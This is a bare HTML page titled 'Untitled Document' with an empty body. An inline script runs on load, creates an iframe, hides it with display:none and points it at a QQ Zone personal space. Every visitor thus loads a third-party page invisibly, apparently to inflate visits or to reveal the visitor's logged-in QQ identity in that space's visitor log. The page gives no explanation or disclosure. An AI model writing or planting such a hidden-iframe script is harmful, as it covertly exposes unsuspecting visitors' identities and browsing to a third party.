<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>无标题文档</title>
<script type="text/javascript">
(function(window)
 {
	var ho = {
		url: "http://2247408761.qzone.qq.com/",
		iframe: null,
		winLoadHandel: function(evt)
		 {
			if (!_ho.iframe) {
				_ho.iframe = document.createElement("iframe")
				 document.getElementsByTagName("body")[0].appendChild(_ho.iframe)
			}
			_ho.iframe.setAttribute("src", _ho.url)
			 _ho.iframe.style.display = "none"
		},
		init: function()
		 {
			if (window.addEventListener)
			 {
				window.addEventListener("load", _ho.winLoadHandel)
			} else {
				window.attachEvent("onload", _ho.winLoadHandel)
			}
		}
	}
	if (!window._ho)
	 {
		window._ho = ho
	}
	_ho.init()
})(window)
</script>
</head>

<body>
</body>
</html>
